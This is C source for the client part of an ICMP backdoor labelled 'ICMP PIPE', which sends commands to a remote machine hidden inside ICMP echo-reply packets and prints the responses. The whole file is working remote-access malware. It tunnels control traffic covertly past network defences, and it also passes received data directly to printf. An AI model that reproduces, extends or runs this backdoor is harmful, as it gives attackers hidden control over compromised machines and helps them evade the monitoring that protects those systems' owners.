/* icmpc.c - ICMP backdoor client */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <netdb.h>

#define LID 12345
#define VER "0.3"

unsigned int RID;
unsigned long host,myip;
int state=0;
unsigned long int res(char *p);
void send_connect(unsigned long to, unsigned int id,char *data);
void get_string_and_send(void);
void show_shit(char *buf);
u_short cksum(u_short *buf, int nwords);

void main(int argc, char **argv)
{
  char buf[512];
  struct iphdr *ip = (struct iphdr *)buf;
  struct icmphdr *icmp = (struct icmphdr *)(buf+sizeof(struct iphdr));
  int i,lsock;
  fd_set f;
  printf("ICMP PIPE %s - CLIENT PART - BiT'97\n",VER);
    if(argc<3)
      printf("%s <host> <rid>\n",*argv),exit(-1);
        if(geteuid())
          printf("User luser detected\n"),exit(-1);
          host=res(argv[1]);
          RID=atoi(argv[2]);
          lsock=socket(AF_INET,SOCK_RAW,1);
          send_connect(host,RID,"a");
          state=1;
  fcntl(lsock,F_SETFL,O_NONBLOCK);
  fcntl(fileno(stdin),F_SETFL,O_NONBLOCK);

  while(1)
  {
    fflush(stdout);
    fflush(stdin);
    FD_ZERO(&f);
    FD_SET(fileno(stdin),&f);
    FD_SET(lsock,&f);
      if(select(FD_SETSIZE,&f,NULL,NULL,NULL))
        {
        if(FD_ISSET(fileno(stdin),&f))
          get_string_and_send();
            if(FD_ISSET(lsock,&f)) {
              i=read(lsock,buf,512);
                if(ip->protocol == 1 && icmp->type == 0 &&
                           ntohs(icmp->un.echo.id) == LID) {
                  if(state==2)
                    show_shit(buf);
                      if(state==1) {
                        state++;
                        printf("Connected.\n");
                      }
                      myip=ip->daddr;
                 }
            }
      }
  }
}

unsigned long int res(char *p)
{
  struct hostent *h;
  unsigned long int rv;

  h=gethostbyname(p);
    if(h!=NULL)
      memcpy(&rv,h->h_addr,h->h_length);
    else
      rv=inet_addr(p);
      return rv;
}

void send_connect(unsigned long to, unsigned int id,char *data)
{
  char buf[512];
  struct icmphdr *icmp = (struct icmphdr *)buf;
  char *bla=(buf+sizeof(struct icmphdr));
  struct sockaddr_in sa;
  int i,ssock;

  ssock=socket(AF_INET,SOCK_RAW,1);
  bzero(buf,512);
  icmp->type=0;
  icmp->un.echo.id=htons(id);
  strcpy(bla,data);
  icmp->checksum=cksum((u_short *)icmp,(9+strlen(data))>>1);
  sa.sin_family=AF_INET;
  sa.sin_addr.s_addr=to;
  i=sendto(ssock,buf,(9+strlen(data)),0,(struct sockaddr *)&sa,sizeof(sa));
  close(ssock);
}

void get_string_and_send(void)
{
  char buf[512];
  bzero(buf,512);
  read(0,buf,512);
  buf[strlen(buf)-1]=0;
  send_connect(host,RID,buf);
    if(strcasecmp(buf,"exit") == 0)
      exit(1);
}

void show_shit(char *buf)
{
  printf((buf+sizeof(struct iphdr)+sizeof(struct icmphdr)));
}

u_short cksum(u_short *buf, int nwords) {
  unsigned long sum;
    for ( sum = 0; nwords > 0; nwords -- )
      sum += *buf++;
      sum = ( sum >> 16) + ( sum & 0xffff );
      sum += ( sum >> 16 );
    return ~sum ;
}
